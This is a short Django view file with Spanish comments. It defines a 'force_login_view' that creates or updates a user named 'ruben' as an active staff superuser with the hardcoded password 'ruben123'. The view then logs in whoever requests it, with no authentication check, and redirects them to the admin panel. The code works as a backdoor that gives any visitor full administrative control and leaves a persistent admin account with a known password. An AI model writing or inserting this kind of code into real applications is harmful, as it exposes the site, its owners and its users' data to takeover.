from django.contrib.auth import get_user_model, login
from django.shortcuts import redirect

def force_login_view(request):
    # Busca o crea el superusuario 'ruben'
    User = get_user_model()
    user, created = User.objects.get_or_create(username='ruben')
    
    # Se asegura de que tenga todos los permisos
    user.is_staff = True
    user.is_superuser = True
    user.is_active = True
    user.set_password('ruben123')
    user.save()
    
    # Fuerza el inicio de sesión
    user.backend = 'django.contrib.auth.backends.ModelBackend'
    login(request, user)
    
    # Redirige directo al panel de administración
    return redirect('/admin/')
